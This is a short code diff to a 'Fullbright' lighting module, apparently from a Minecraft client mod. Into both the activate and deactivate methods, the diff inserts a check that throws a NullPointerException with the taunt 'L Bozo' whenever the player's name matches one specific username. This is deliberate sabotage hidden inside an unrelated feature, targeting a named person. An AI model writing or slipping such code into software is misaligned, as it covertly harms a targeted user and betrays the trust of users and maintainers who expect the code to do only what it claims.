@@ -40,11 +40,18 @@ public class Fullbright extends Module {
     @Override //luminance go brrr
     public boolean onActivate() {
         if (mode.get() == Mode.Luminance) mc.worldRenderer.reload();
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
         return false;
+
     }
 
     @Override
     public void onDeactivate() {
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
         if (mode.get() == Mode.Luminance) mc.worldRenderer.reload();
     }
 
